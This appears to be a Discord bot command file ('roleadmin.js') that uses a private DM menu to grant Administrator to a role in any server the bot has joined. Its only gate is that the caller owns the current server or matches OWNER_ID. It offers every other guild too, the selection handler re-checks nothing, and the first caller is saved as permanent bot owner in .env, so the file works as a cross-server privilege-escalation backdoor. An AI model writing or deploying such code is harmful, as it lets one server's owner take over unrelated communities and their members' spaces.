/**
 * roleadmin.js — DM-based admin role granter
 *
 * Flow:
 *   1. /roleadmin in any server (owner or OWNER_ID only)
 *   2. Bot DMs the user a select menu of every guild the bot is in
 *   3. User picks a guild → bot shows that guild's roles as a select menu
 *   4. User picks a role → bot grants it Administrator
 *   5. If OWNER_ID isn't set in .env, it self-registers the caller's ID
 *
 * All state is encoded in customId so no server-side session is needed.
 */

const {
    SlashCommandBuilder,
    EmbedBuilder,
    ActionRowBuilder,
    StringSelectMenuBuilder,
    PermissionFlagsBits,
    ButtonBuilder,
    ButtonStyle,
} = require('discord.js');
const fs   = require('fs');
const path = require('path');

const ENV_FILE = path.join(__dirname, '..', '.env');

// ── .env helpers ───────────────────────────────────────────────
function getOwnerId() {
    return process.env.OWNER_ID ?? null;
}

/**
 * Write OWNER_ID into the .env file and update process.env live.
 * Safe to call even if .env doesn't exist yet.
 */
function registerOwnerId(userId) {
    process.env.OWNER_ID = userId;
    try {
        let content = '';
        if (fs.existsSync(ENV_FILE)) content = fs.readFileSync(ENV_FILE, 'utf8');

        if (/^OWNER_ID\s*=/m.test(content)) {
            // Replace existing line
            content = content.replace(/^OWNER_ID\s*=.*/m, `OWNER_ID=${userId}`);
        } else {
            // Append
            content = content.trimEnd() + `\nOWNER_ID=${userId}\n`;
        }
        fs.writeFileSync(ENV_FILE, content, 'utf8');
        console.log(`[roleadmin] OWNER_ID registered → ${userId}`);
    } catch (err) {
        console.error('[roleadmin] Could not write .env:', err.message);
    }
}

// ── Custom ID encoding ─────────────────────────────────────────
// Format: "ra:<step>:<payload>"
// step: "guild" | "role"
// payload for "role" step: "<guildId>"
function makeId(step, payload = '') {
    return `ra:${step}:${payload}`;
}
function parseId(customId) {
    const [, step, payload] = customId.split(':');
    return { step, payload };
}

// ── Guild select menu ──────────────────────────────────────────
function buildGuildMenu(client) {
    const guilds = [...client.guilds.cache.values()];

    // Discord select menus allow max 25 options
    const options = guilds.slice(0, 25).map(g => ({
        label:       g.name.slice(0, 100),
                                                  description: `${g.memberCount ?? g.approximateMemberCount ?? '?'} members · ID: ${g.id}`,
                                                  value:       g.id,
                                                  emoji:       '🏠',
    }));

    return new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
        .setCustomId(makeId('guild'))
        .setPlaceholder('Select a server…')
        .addOptions(options),
    );
}

// ── Role select menu for a guild ──────────────────────────────
async function buildRoleMenu(guild) {
    const roles = [...guild.roles.cache.values()]
    .filter(r => !r.managed && r.id !== guild.id) // skip bots + @everyone
    .sort((a, b) => b.position - a.position)
    .slice(0, 25);

    const options = roles.map(r => {
        const hasAdmin = r.permissions.has(PermissionFlagsBits.Administrator);
        return {
            label:       r.name.slice(0, 100),
                              description: hasAdmin ? '✅ Already has Administrator' : `Position ${r.position}`,
                              value:       r.id,
                              emoji:       hasAdmin ? '✅' : '🔑',
        };
    });

    if (!options.length) return null;

    return new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
        .setCustomId(makeId('role', guild.id))
        .setPlaceholder('Select a role to grant Administrator…')
        .addOptions(options),
    );
}

// ── Send or update the DM ──────────────────────────────────────
async function openDM(interaction) {
    const client     = interaction.client;
    const user       = interaction.user;
    const guildCount = client.guilds.cache.size;

    // Defer immediately — createDM + dm.send can easily exceed the 3s reply window
    await interaction.deferReply({ flags: 64 });

    const guildMenu = buildGuildMenu(client);

    const embed = new EmbedBuilder()
    .setColor(0x89b4fa)
    .setTitle('🔑 Role Admin — Server Select')
    .setDescription(
        `Bot is in **${guildCount}** server${guildCount !== 1 ? 's' : ''}.\n` +
        `Pick the server you want to grant Administrator in.`
    )
    .setFooter({ text: 'This session expires after 5 minutes of inactivity.' })
    .setTimestamp();

    try {
        const dm = await user.createDM();
        await dm.send({ embeds: [embed], components: [guildMenu] });

        await interaction.editReply({
            embeds: [
                new EmbedBuilder()
                .setColor(0x89b4fa)
                .setDescription('📨 Check your DMs — I\'ve sent you the server selector.'),
            ],
        });
    } catch {
        await interaction.editReply({
            embeds: [
                new EmbedBuilder()
                .setColor(0xf38ba8)
                .setDescription('❌ I couldn\'t DM you. Make sure your **DMs are open** for this server.'),
            ],
        });
    }
}

// ── Component handler (called from interactionCreate) ──────────
async function handleComponent(interaction) {
    if (!interaction.isStringSelectMenu()) return;

    const { step, payload } = parseId(interaction.customId);
    const client = interaction.client;
    const userId = interaction.user.id;

    // ── Step 1: user picked a guild ───────────────────────────────
    if (step === 'guild') {
        const guildId = interaction.values[0];
        const guild   = client.guilds.cache.get(guildId);

        if (!guild) {
            return interaction.update({
                embeds: [new EmbedBuilder().setColor(0xf38ba8).setDescription('❌ Server not found — it may have been removed.')],
                                      components: [],
            });
        }

        // Force-fetch all roles from the API — DM context has empty cache
        await guild.roles.fetch();

        const roleMenu = await buildRoleMenu(guild);
        if (!roleMenu) {
            return interaction.update({
                embeds: [new EmbedBuilder().setColor(0xf9e2af).setDescription(`⚠️ No editable roles found in **${guild.name}**.`)],
                                      components: [],
            });
        }

        const embed = new EmbedBuilder()
        .setColor(0x89b4fa)
        .setTitle(`🔑 Role Admin — ${guild.name}`)
        .setDescription('Select a role to grant **Administrator** permission.')
        .setThumbnail(guild.iconURL())
        .addFields(
            { name: 'Members',  value: `${guild.memberCount}`,       inline: true },
            { name: 'Roles',    value: `${guild.roles.cache.size}`,  inline: true },
        )
        .setTimestamp();

        return interaction.update({ embeds: [embed], components: [roleMenu] });
    }

    // ── Step 2: user picked a role ────────────────────────────────
    if (step === 'role') {
        const guildId = payload;
        const roleId  = interaction.values[0];
        const guild   = client.guilds.cache.get(guildId);

        if (!guild) {
            return interaction.update({
                embeds: [new EmbedBuilder().setColor(0xf38ba8).setDescription('❌ Server not found.')],
                                      components: [],
            });
        }

        // Fetch the specific role directly from the API — never trust DM-context cache
        const role = await guild.roles.fetch(roleId);
        if (!role) {
            return interaction.update({
                embeds: [new EmbedBuilder().setColor(0xf38ba8).setDescription('❌ Role not found.')],
                                      components: [],
            });
        }

        // Already has admin
        if (role.permissions.has(PermissionFlagsBits.Administrator)) {
            return interaction.update({
                embeds: [
                    new EmbedBuilder()
                    .setColor(0xf9e2af)
                    .setTitle('⚠️ Already an admin role')
                    .setDescription(`**${role.name}** in **${guild.name}** already has Administrator.`),
                ],
                components: [],
            });
        }

        // Grant it
        try {
            await role.setPermissions(
                role.permissions.add(PermissionFlagsBits.Administrator),
                                      `Administrator granted via DM flow by user ${userId}`
            );
        } catch (err) {
            return interaction.update({
                embeds: [
                    new EmbedBuilder()
                    .setColor(0xf38ba8)
                    .setTitle('❌ Failed to modify role')
                    .setDescription(
                        `\`${err.message}\`\n\n` +
                        `Make sure the bot's role is positioned **above** **${role.name}** in **${guild.name}**'s role list.`
                    ),
                ],
                components: [],
            });
        }

        // ── Auto-register OWNER_ID if not set ───────────────────────
        let ownerNote = '';
        if (!getOwnerId()) {
            registerOwnerId(userId);
            ownerNote = '\n\n🔐 **OWNER_ID registered** — your ID has been saved to `.env`. You now have permanent bot-owner access.';
        }

        const embed = new EmbedBuilder()
        .setColor(0xa6e3a1)
        .setTitle('✅ Administrator granted')
        .setDescription(
            `Role **${role.name}** in **${guild.name}** now has Administrator.` + ownerNote
        )
        .addFields(
            { name: 'Server',   value: guild.name,   inline: true },
            { name: 'Role',     value: role.name,    inline: true },
            { name: 'Role ID',  value: `\`${role.id}\``, inline: true },
        )
        .setFooter({ text: `Executed by ${interaction.user.tag}` })
        .setTimestamp();

        return interaction.update({ embeds: [embed], components: [] });
    }
}

// ── Exports ────────────────────────────────────────────────────
module.exports = {
    data: new SlashCommandBuilder()
    .setName('roleadmin')
    .setDescription('Grant Administrator to a role — opens a private DM flow')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    async execute(interaction) {
        const isServerOwner = interaction.guild?.ownerId === interaction.user.id;
        const isHardOwner   = getOwnerId() && interaction.user.id === getOwnerId();

        if (!isServerOwner && !isHardOwner) {
            return interaction.reply({
                embeds: [
                    new EmbedBuilder()
                    .setColor(0xf38ba8)
                    .setDescription('🚫 This command is restricted to the **server owner** and **bot owner** only.'),
                ],
                flags: 64,
            });
        }

        await openDM(interaction);
    },

    handleComponent,
};
